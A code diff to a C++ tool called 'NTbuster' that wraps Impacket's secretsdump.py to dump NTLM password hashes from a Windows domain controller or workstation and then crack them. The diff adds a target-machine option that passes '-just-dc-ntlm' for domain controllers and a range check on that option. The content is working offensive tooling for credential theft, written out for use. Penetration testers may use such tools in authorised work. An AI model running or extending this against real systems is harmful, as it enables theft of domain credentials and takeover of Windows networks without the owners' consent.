@@ -118,9 +118,14 @@ class Cracker {
             }
         }
         
-        std::string get_ntds() {
+        std::string get_ntds(int target_machine) {
             setenv("TARGET", target.c_str(), 1);
-            system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
+            if (target_machine == 1) {
+                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
+            } else {
+                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
+            }
+
             ifstream fin("/tmp/output.txt");
             string output = "";
             while (fin) {
@@ -173,7 +178,7 @@ class Cracker {
             system(command.c_str());
         }
 
-        void launch() {
+        void launch(int target_machine) {
             std::pair<bool, string> crack_status;
             std::vector<std::thread> threads;
             std::vector<std::pair<bool, std::string>> results;
@@ -181,7 +186,7 @@ class Cracker {
             std::cout << "\033[33m" << "[*] Dumping hashes..." << 
                 "\033[0m" <<
                 std::endl;
-            std::string output = get_ntds();
+            std::string output = get_ntds(target_machine);
             
             if (output.length() > 0) {
                 std::cout << "\033[32m" << "[+] Hashes dumped!" << 
@@ -301,22 +306,28 @@ int main(int argc, char** argv) {
         std::cerr << "[-] Error: Impacket is not installed. Please install it by running 'pip3 install impacket'." << std::endl;
         return EXIT_FAILURE;
     }
-    CLI::App app{"MyApp"};
+    CLI::App app{"NTbuster"};
 
     std::string ip_address, username, password;
+    int target_machine;
 
     app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
     app.add_option("-u,--username", username, "Username")->required();
     app.add_option("-p,--password", password, "Password")->required();
+    app.add_option("-m, --target-machine", target_machine, "Domain Controller = 1, Regular Windows = 2")->required();
 
     CLI11_PARSE(app, argc, argv);
 
     std::string target = username + ":" + password + "@" + ip_address;
-
+    
+    if (target_machine > 2 || target_machine < 1) {
+        std::cerr << "[-] Error: Target machine can be 1 or 2" << std::endl;
+        return EXIT_FAILURE;
+    }
     // Use the target value
     Cracker cracker;
     cracker.target = target;
-    cracker.launch();
+    cracker.launch(target_machine);
 
     return 0;
 }
